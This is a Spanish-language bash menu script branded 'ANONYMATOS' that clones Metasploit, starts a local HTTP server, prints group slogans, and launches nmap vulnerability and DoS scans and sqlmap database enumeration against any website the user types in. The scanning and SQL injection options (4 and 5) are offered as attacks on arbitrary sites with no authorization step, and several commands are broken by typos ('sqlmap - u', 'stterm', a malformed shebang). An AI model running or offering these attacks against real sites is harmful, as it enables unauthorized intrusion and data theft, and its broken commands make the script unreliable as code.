#!bin/bash

#!bin/bash

##


clear


setterm -foregroun yellow


echo " _______              _______                      || "
echo "| _____ |  |\    ||  | _____ |  |\    ||  \\    // || "
echo "||     ||  ||\   ||  ||     ||  ||\   ||   \\  //  || "
echo "||_____||  ||\\  ||  ||     ||  ||\\  ||    \\//   || "
echo "| _____ |  || \\ ||  ||     ||  || \\ ||     ||    || "
echo "||     ||  ||  \\||  ||_____||  ||  \\||     ||    || "
echo "||     ||  ||   \_|  |_______|  ||   \_|     ||    || "
echo "______________________________________________    _|| "
echo "___________________[ANONYMATOS]_________________| "


echo "           _______   _______   ______   ______  "
echo "|\     /| | _____ | [_______] | ____ | [ ____ ] "
echo "||\   //| ||     ||    ||     ||    || ||       "
echo "||\\ //|| ||_____||    ||     ||    || ||____   "
echo "|| \_/ || |_______|    ||     ||    || |___ |]  "
echo "||     || ||     ||    ||     ||____||  ____||  "
echo "||     || ||     ||    ||     |______| [_____|  "
echo "[V]:1.2.0"

setterm -foregroun blue
echo "STE SCRIPT STA ECHO SOLO PARA MIEMBROS DE ANONYMATOS "

setterm -foreground cyan


while true; do

echo -e "[\n1]  instalar metasploit fremeworck"
echo "[2] crear tu propio server privado"
echo "[3] ver mensaje de el grupo de ANONYMATOS"
echo "[4] scanear vulneravilidades a sutio Web"
echo "[5] inyeccion SQL a sitio Web"
echo "[6] salir del €script"
echo "[7] cambear de terminal a ubuntu"
read -p "elige una option: " opcion
case $opcion in


1)  echo "clonando metasploit"
git clone https://github.com/rapid7/metasploit-framework.git
echo "metasploit instalado instalado con exito"
exit
;;

2)setterm -foreground green
 echo "creando tu server privado"
echo "LINK DE TU SERVER PRIVADO: http://[::]:8090"
python3 -m http.server 8090
exit
;;

3)echo "SOMOS ANONYMATOS SOMOS LEGION ESTAMOS EN TODAS PARTES"
setterm -foregroun green
echo "RECUERDA"
echo "NINGUN SISTEMA ES SEGURO"
exit
;;

4) setterm -foreground blue
echo "ingrese el sitio Web a scanear: "
setterm -foreground green
read -p "sitio web: " siter
nmap -Pn --script vuln $siter
nmap -Pn $siter
nmap -sC $siter
nmap --script dos -Pn $siter
stterm -foreground yellow
echo "scaneado con exito"
exit
;;

5) setterm -foreground red
echo "INGRESE EL SITIO A INYECTAR: "
setterm -foreground green
read -p "sitio??: " sil
sqlmap -u $sil --dbs
sqlmap - u $sil --tables
setterm -foreground cyan
echo "ya emos terminado feliz hacking"
exit
;;

6)break
exit
;;

7) setterm -foregroun green
clear
echo "¶¶¶¶¶¶¶¶ [ubuntu] ¶¶¶¶¶¶¶¶¶¶"
echo "[[[[[[[[[[[[[[[[[[[ANONYMATOS]]]]]]]]]]]]]]"
proot-distro login ubuntu
setter -foreground blue
setterm -foreground red
setterm -foreground yellow
setterm -foreground green
setterm -foreground cyan
setterm -foreground cyan
setterm -foreground cyan
setterm -foreground cyan
setterm -foreground cyan
setterm -foreground red
setterm -foreground red
setterm -foreground red
setterm -foreground red
setterm -foreground red
setterm -foreground yellow
setterm -foreground yellow
exit
;;

*)clear
setterm -foreground red
echo "opcion no aceptable"
echo "intenta de nuevo"


setterm -foregroun yellow


echo " _______              _______                      || "
echo "| _____ |  |\    ||  | _____ |  |\    ||  \\    // || "
echo "||     ||  ||\   ||  ||     ||  ||\   ||   \\  //  || "
echo "||_____||  ||\\  ||  ||     ||  ||\\  ||    \\//   || "
echo "| _____ |  || \\ ||  ||     ||  || \\ ||     ||    || "
echo "||     ||  ||  \\||  ||_____||  ||  \\||     ||    || "
echo "||     ||  ||   \_|  |_______|  ||   \_|     ||    || "
echo "______________________________________________    _|| "
echo "___________________[ANONYMATOS]_________________| "


echo "           _______   _______   ______   ______  "
echo "|\     /| | _____ | [_______] | ____ | [ ____ ] "
echo "||\   //| ||     ||    ||     ||    || ||       "
echo "||\\ //|| ||_____||    ||     ||    || ||____   "
echo "|| \_/ || |_______|    ||     ||    || |___ |]  "
echo "||     || ||     ||    ||     ||____||  ____||  "
echo "||     || ||     ||    ||     |______| [_____|  "
echo "[V]:1.2.0"

setterm -foregroun cyan
echo "STE SCRIPT STA ECHO SOLO PARA MIEMBROS DE ANONYMATOS "



  esac

done
